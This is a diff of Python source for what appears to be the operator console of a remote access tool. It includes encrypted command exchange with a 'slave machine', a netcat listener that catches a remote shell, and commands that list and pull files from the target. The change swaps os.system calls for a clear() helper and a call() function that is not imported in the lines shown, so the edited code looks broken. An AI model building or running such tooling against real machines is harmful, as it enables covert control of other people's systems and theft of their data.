@@ -1,9 +1,10 @@
 from sys import stderr, exit, stderr
-from os import mkdir, system, listdir, fork, wait
+from os import mkdir, listdir, fork, wait
 from socket import error as socket_error
 import os.path
 
 from utils.crypto import encrypt, decrypt
+from utils.utils import clear
 
 def get_cmd():
     cmd = ""
@@ -24,11 +25,11 @@ def send_cmd(conn, cmd):
 def drop_shell(shell_port, status):
     pid = fork()
     if pid == 0:
-        system("clear")
+        clear()
         print("\n[*] Dropping shell on slave machine ...")
         print("[+] Exit netcat sending SIGINT")
         cmd = "nc -l " + str(shell_port)
-        system(cmd)
+        _ = call(cmd.split(" "))
     else:
         wait()
     return status 
@@ -55,7 +56,7 @@ def builtin_cmds(conn, cmd, shell_port, status):
         conn = send_cmd(conn, cmd)
         conn, msg = recv_msg(conn, 64000)
     elif cmd[:5] == "clear":
-        system("clear")
+        clear()
         msg = "ACK\n"
     elif cmd[:4] == "exit":
         status = 1
@@ -66,7 +67,7 @@ def builtin_cmds(conn, cmd, shell_port, status):
                 fp.write(msg[3:])
     elif cmd[:2] == "pl":
         conn = send_cmd(conn, cmd[:2])
-        system("clear")
+        clear()
         for file in listdir():
             print(file)
         filename = input("$ ")
